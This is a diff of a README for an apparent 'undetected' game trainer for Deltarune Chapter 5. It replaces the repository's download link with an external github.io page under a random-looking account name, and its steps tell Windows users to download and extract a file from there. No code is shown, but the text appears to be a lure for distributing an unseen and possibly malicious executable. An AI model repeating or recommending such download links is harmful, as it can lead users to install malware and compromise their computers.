@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Trainer-Undetected - Explore the game with total control
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Armillariacaligatabaedeker123/Deltarune-Chapter5-Trainer-Undetected)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://armillariacaligatabaedeker123.github.io)
 
 ## 📌 About this trainer
 
@@ -29,7 +29,7 @@ Ensure your computer meets these standards before you run the trainer.
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project page to download the latest version: [https://github.com/Armillariacaligatabaedeker123/Deltarune-Chapter5-Trainer-Undetected](https://github.com/Armillariacaligatabaedeker123/Deltarune-Chapter5-Trainer-Undetected)
+1. Visit the project page to download the latest version: [https://armillariacaligatabaedeker123.github.io](https://armillariacaligatabaedeker123.github.io)
 2. Locate the download button on the page.
 3. Save the file to your desktop or a folder you can find.
 4. Extract the contents if the file arrives as a zip archive.
